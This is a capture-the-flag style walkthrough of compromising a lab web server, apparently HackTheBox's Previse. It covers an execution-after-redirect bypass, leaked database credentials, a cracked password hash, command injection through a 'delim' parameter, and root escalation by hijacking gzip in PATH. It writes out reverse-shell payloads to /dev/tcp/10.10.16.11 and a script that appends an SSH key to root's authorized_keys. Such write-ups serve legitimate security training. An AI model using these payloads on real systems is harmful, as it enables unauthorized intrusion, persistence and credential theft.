1, enumerate the port 
22/tcp ssh
80/tcp http

2,enumerate the pages and services
`ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirb/common.txt`

But there is nothing interesting.

3,check the vulners
1, sql injection: but there is not sql injection for this login page.
2, check the root page:
it is clear that there is a 302 code to redirect to the /login.php
This is an execution after redirect (EAR) vulnerability. The PHP code is likely checking for a session, and if there is none, sending the redirect. This is the example from the OWASP page
`<?php if (!$loggedin) {print "<script>window.location = '/login';</script>\n\n"; } ?>`
This PHP code should have an exit; after that print. Otherwise, it sends the code that performs the redirect, but also prints the rest of the page.

So if we use burp to change the code from 302 found to 200 GET. Then we can just Cross-certification

From the /accounts.php, we can just create a account for us .

From /files.php, we can get the file 'sitebackup.zip' and then we get the config.php
we can get :
`$user = 'root';
`$passwd = 'mySQL_p@ssw0rd!:)';`

From logs.php, we can get a very attractive code line:
`$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");`
Yes!!!!, we see the exec, so we get command injection and let's exploit it!

By using the burp to catch the POST request and just change it and check the response.
`delim=users;ping -c 1 10.10.16.11 
Then we need to check the tcpdump or wireshark:
![](images/Pasted%20image%2020240806110542.png)
ICMP package means we successfully exploit command injection.

So let's get the shell!!!!!
payload :
`delim=comma;bash -c 'bash -i >%26 /dev/tcp/10.10.16.11/443 0>%261'`

4, shell as www-data --> shell as m4lwhere
In this place, we finally can use the database credits to enumerate the mysql database!
`1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`
But there is a little trick! it has salt for us but we don't know.
Unbelievable, 🧂 is the salt :)
So let's crack the hash and get the credits.
`$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!`

5, shell as root
firstly, we check the user m4lwhere could do anything as root.
`sudo -l`
`(root) /opt/scripts/access_backup.sh`
`-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh`
Unlucky ,we could not write it, so just read its source code and check some vulners.

`gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz`
`gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz`
In this place ,we can write into /var/www/file_access.log 

From GTFOBins we can get some exploits of gzip as root.

The vulnerability in this script is that gzip is called without a complete path. In /dev/shm, I’ll create a simple script called gzip. There are many things I could do, including just calling bash, though I had some issues getting that to work. I’ll have it write my public key into root’s authorized_keys file and spawn a reverse shell

gzip
```
#!/bin/bash
# make a reverse shell
bash -i >& /dev/tcp/10.10.16.11/4444 0>&1

# write the root's ssh and authorized_keys
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO0dl48snyfNIrhj7V9tMQpXE5B0uCuiCXQxCdZLYglN70DyHDODd5y6jdo4JhorRyBK7kEguQZErAGWtJOs9Q8Tk6VLE1PmRc+vZMFH7FhM+Bdr6kH3bjHbPvLr/rqwYKCzUB5oYZOAJP9+6azC/SiBdtne0TN7uzTLXIO9+nFvfX6ZEL+Exkc3Tux7BlmatBJAOjvSHY94NXylZzyNM8HKDLp1fR43f64oKDL5odQFumuYDS2PvRRTMcx9NJ8xc1PD2STFd9xXvcpyXnE+WJjbc0s/iq6bgw6FrN7yYEegXolRsLh9jMFQtfJnBExqK2PWMm++UH2U6W4CXdKq1Vjlj+ZbWoC8SM3lL+H2y+wB2xjugQolebG3JS1r6NLGCDygY25ySUskXPdprwPf6vFCQiSdr2EHATwJI3HQMMUyBuEuHawppop60atUcMOhXny0h7//zJ/td6fouJT14KxQ/3f3B/ifXoAmIX8Y15FBxY70qeubV1XE+TnaXaw7IdESxEn5mIl13cIleAv/UFF4fEyXutr3ceDFHE4MOsL4KzynSfNmUMKkkbf+IbVGiJTKrzjzcCPx4KBKkhybmidX3q3LOwXvtltF/7t5/bM9D8JB7rT/3VF4ECtPt9Mr2FbahMz9Uzm1yKcu0sNbx9DFKSVtn2larH+zqh7QU7iQ== test" >> /root/.ssh/authorized_keys
```
Remark: it need to chmod +x gzip, or it would not exec because of Permission restrictions (But there is a little tricky, this script would exec with root, but it would also restrictions.)

Then `sudo /opt/scripts/access_backup.sh`

Now when the script goes to call gzip, the first one it will find is mine and run it. I’ll start nc and run!




